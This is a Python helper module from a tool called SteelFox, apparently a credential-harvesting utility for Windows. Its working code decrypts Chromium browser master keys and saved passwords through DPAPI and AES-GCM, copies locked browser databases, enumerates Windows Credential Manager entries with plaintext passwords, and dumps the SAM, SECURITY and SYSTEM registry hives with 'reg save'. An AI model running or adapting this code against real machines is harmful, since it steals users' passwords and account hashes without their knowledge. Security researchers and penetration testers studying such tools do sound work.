# -*- coding: utf-8 -*-
"""
SteelFox — Windows API Structures & Crypto Helpers

Provides ctypes definitions, DPAPI wrappers, registry helpers, and crypto
utilities needed by multiple modules.
"""

from __future__ import annotations

import base64
import ctypes
import ctypes.wintypes
import json
import logging
import os
import shutil
import sqlite3
import struct
import subprocess
import tempfile
from pathlib import Path
from typing import Any

logger = logging.getLogger("steelfox")


# ═══════════════════════════════════════════════════════════════════════════
# Win32 Constants
# ═══════════════════════════════════════════════════════════════════════════

CRED_TYPE_GENERIC = 0x01
CRED_TYPE_DOMAIN_PASSWORD = 0x02
CRED_TYPE_DOMAIN_CERTIFICATE = 0x03
CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 0x04

HKEY_CURRENT_USER = 0x80000001
HKEY_LOCAL_MACHINE = 0x80000002
HKEY_USERS = 0x80000003

KEY_READ = 0x20019
KEY_WOW64_64KEY = 0x0100
KEY_WOW64_32KEY = 0x0200

TOKEN_ALL_ACCESS = 0x000F01FF
TOKEN_QUERY = 0x0008
SE_DEBUG_PRIVILEGE = 0x14


# ═══════════════════════════════════════════════════════════════════════════
# ctypes Structures
# ═══════════════════════════════════════════════════════════════════════════

class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", ctypes.wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_char)),
    ]


class CREDENTIAL_ATTRIBUTE(ctypes.Structure):
    _fields_ = [
        ("Keyword", ctypes.c_wchar_p),
        ("Flags", ctypes.wintypes.DWORD),
        ("ValueSize", ctypes.wintypes.DWORD),
        ("Value", ctypes.POINTER(ctypes.c_byte)),
    ]


class CREDENTIAL(ctypes.Structure):
    _fields_ = [
        ("Flags", ctypes.wintypes.DWORD),
        ("Type", ctypes.wintypes.DWORD),
        ("TargetName", ctypes.c_wchar_p),
        ("Comment", ctypes.c_wchar_p),
        ("LastWritten", ctypes.wintypes.FILETIME),
        ("CredentialBlobSize", ctypes.wintypes.DWORD),
        ("CredentialBlob", ctypes.POINTER(ctypes.c_char)),
        ("Persist", ctypes.wintypes.DWORD),
        ("AttributeCount", ctypes.wintypes.DWORD),
        ("Attributes", ctypes.POINTER(CREDENTIAL_ATTRIBUTE)),
        ("TargetAlias", ctypes.c_wchar_p),
        ("UserName", ctypes.c_wchar_p),
    ]


PCREDENTIAL = ctypes.POINTER(CREDENTIAL)


# ═══════════════════════════════════════════════════════════════════════════
# CryptUnprotectData (DPAPI)
# ═══════════════════════════════════════════════════════════════════════════

def win32_crypt_unprotect_data(
    cipher_text: bytes,
    entropy: bytes = b"",
) -> bytes:
    """Decrypt data using Windows DPAPI (CryptUnprotectData).

    This only works for the currently logged-in user's keys.
    """
    # Create proper POINTER(c_char) buffers instead of c_char_p
    # c_char_p is null-terminated (truncates on \x00), POINTER(c_char) is safe
    buf_in = ctypes.create_string_buffer(cipher_text, len(cipher_text))
    blob_in = DATA_BLOB(len(cipher_text), ctypes.cast(buf_in, ctypes.POINTER(ctypes.c_char)))

    blob_entropy = DATA_BLOB()
    buf_entropy = None
    if entropy:
        buf_entropy = ctypes.create_string_buffer(entropy, len(entropy))
        blob_entropy = DATA_BLOB(len(entropy), ctypes.cast(buf_entropy, ctypes.POINTER(ctypes.c_char)))

    blob_out = DATA_BLOB()

    result = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in),
        None,
        ctypes.byref(blob_entropy) if entropy else None,
        None,
        None,
        0,
        ctypes.byref(blob_out),
    )

    if not result:
        raise OSError(f"CryptUnprotectData failed (error {ctypes.GetLastError()})")

    raw = ctypes.string_at(blob_out.pbData, blob_out.cbData)
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return raw


# ═══════════════════════════════════════════════════════════════════════════
# Registry Helpers
# ═══════════════════════════════════════════════════════════════════════════

def reg_open_key(hive: int, path: str, sam: int = KEY_READ) -> int | None:
    """Open a registry key, returning the handle or None."""
    hkey = ctypes.wintypes.HKEY()
    res = ctypes.windll.advapi32.RegOpenKeyExW(
        hive, path, 0, sam, ctypes.byref(hkey)
    )
    return hkey.value if res == 0 else None


def reg_query_value(hkey: int, name: str) -> str | None:
    """Query a string value from an open registry key."""
    buf_size = ctypes.wintypes.DWORD(1024)
    buf = ctypes.create_unicode_buffer(buf_size.value)
    reg_type = ctypes.wintypes.DWORD()

    res = ctypes.windll.advapi32.RegQueryValueExW(
        hkey, name, None, ctypes.byref(reg_type), buf, ctypes.byref(buf_size)
    )
    if res == 0:
        return buf.value
    return None


def reg_close_key(hkey: int) -> None:
    """Close a registry key handle."""
    ctypes.windll.advapi32.RegCloseKey(hkey)


def reg_read_value(hive: int, path: str, name: str) -> str | None:
    """One-shot: open key, read value, close key."""
    hkey = reg_open_key(hive, path)
    if hkey is None:
        return None
    try:
        return reg_query_value(hkey, name)
    finally:
        reg_close_key(hkey)


# ═══════════════════════════════════════════════════════════════════════════
# Chrome / Chromium AES-GCM Key Extraction (v80+)
# ═══════════════════════════════════════════════════════════════════════════

def get_chromium_master_key(local_state_path: str | Path) -> bytes | None:
    """Extract the AES-256-GCM master key from a Chromium-based browser's
    Local State file by decrypting it with DPAPI.

    Works for Chrome 80+, Edge, Brave, Opera, Vivaldi, etc.
    """
    try:
        path = Path(local_state_path)
        if not path.exists():
            return None

        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            return None

        encrypted_key = base64.b64decode(encrypted_key_b64)
        # Remove "DPAPI" prefix (5 bytes)
        if encrypted_key[:5] == b"DPAPI":
            encrypted_key = encrypted_key[5:]

        return win32_crypt_unprotect_data(encrypted_key)
    except Exception as e:
        logger.debug("Failed to extract Chromium master key: %s", e)
        return None


# ═══════════════════════════════════════════════════════════════════════════
# Chrome Password Decryption (AES-256-GCM, v80+)
# ═══════════════════════════════════════════════════════════════════════════

def decrypt_chromium_password(encrypted_value: bytes, master_key: bytes) -> str:
    """Decrypt a Chrome v80+ password encrypted with AES-256-GCM.

    Structure: b'v10' + nonce(12) + ciphertext + tag(16)
    """
    try:
        from Crypto.Cipher import AES

        if encrypted_value[:3] == b"v10" or encrypted_value[:3] == b"v11":
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(
                ciphertext[:-16], ciphertext[-16:]
            ).decode("utf-8", errors="replace")
        else:
            # Fallback: old DPAPI-only encryption
            return win32_crypt_unprotect_data(encrypted_value).decode(
                "utf-8", errors="replace"
            )
    except Exception as e:
        logger.debug("Chromium password decryption failed: %s", e)
        return ""


# ═══════════════════════════════════════════════════════════════════════════
# SQLite Safe Copy & Read
# ═══════════════════════════════════════════════════════════════════════════

def safe_copy_db(db_path: str | Path) -> str | None:
    """Copy a locked SQLite database to a temp file for safe reading."""
    try:
        src = Path(db_path)
        if not src.exists():
            return None
        tmp = os.path.join(tempfile.gettempdir(), f"sf_{os.getpid()}_{src.name}")
        shutil.copy2(str(src), tmp)
        return tmp
    except Exception as e:
        logger.debug("Could not copy database %s: %s", db_path, e)
        return None


def query_db(db_path: str, query: str) -> list[tuple]:
    """Execute a query on a SQLite database, returning all rows."""
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute(query)
        rows = cursor.fetchall()
        conn.close()
        return rows
    except Exception as e:
        logger.debug("Database query failed on %s: %s", db_path, e)
        return []


# ═══════════════════════════════════════════════════════════════════════════
# Credential Manager Enumeration
# ═══════════════════════════════════════════════════════════════════════════

def enumerate_credential_manager() -> list[dict[str, str]]:
    """Enumerate all credentials from the Windows Credential Manager."""
    results: list[dict[str, str]] = []
    try:
        count = ctypes.wintypes.DWORD()
        creds_ptr = ctypes.POINTER(PCREDENTIAL)()

        advapi32 = ctypes.windll.advapi32
        ret = advapi32.CredEnumerateW(
            None, 0, ctypes.byref(count), ctypes.byref(creds_ptr)
        )

        if not ret:
            return results

        for i in range(count.value):
            cred = creds_ptr[i].contents
            target = cred.TargetName or ""
            username = cred.UserName or ""
            password = ""

            if cred.CredentialBlobSize > 0 and cred.CredentialBlob:
                try:
                    raw = ctypes.string_at(cred.CredentialBlob, cred.CredentialBlobSize)
                    password = raw.decode("utf-16-le", errors="replace")
                except Exception:
                    password = "<binary data>"

            if username or password:
                results.append({
                    "Target": target,
                    "Username": username,
                    "Password": password,
                    "Type": str(cred.Type),
                })

        advapi32.CredFree(creds_ptr)
    except Exception as e:
        logger.debug("Credential Manager enumeration failed: %s", e)

    return results


# ═══════════════════════════════════════════════════════════════════════════
# Hive Operations (for admin SAM/SECURITY/SYSTEM dumps)
# ═══════════════════════════════════════════════════════════════════════════

def save_hives(hive_paths: dict[str, str] | None = None) -> bool:
    """Save SAM, SECURITY, and SYSTEM registry hives to temp files.

    Requires administrator privileges.
    """
    from steelfox.core.config import config as cfg
    paths = hive_paths or cfg.hives

    try:
        for hive_name, tmp_path in paths.items():
            cmd = f'reg save HKLM\\{hive_name} "{tmp_path}" /y'
            subprocess.run(
                cmd, shell=True, capture_output=True, timeout=30
            )
            if not os.path.exists(tmp_path):
                logger.warning("Failed to save hive %s", hive_name)
                return False
        return True
    except Exception as e:
        logger.debug("Hive save failed: %s", e)
        return False


def delete_hives(hive_paths: dict[str, str] | None = None) -> None:
    """Clean up temp hive files."""
    from steelfox.core.config import config as cfg
    paths = hive_paths or cfg.hives

    for tmp_path in paths.values():
        try:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
        except Exception:
            pass
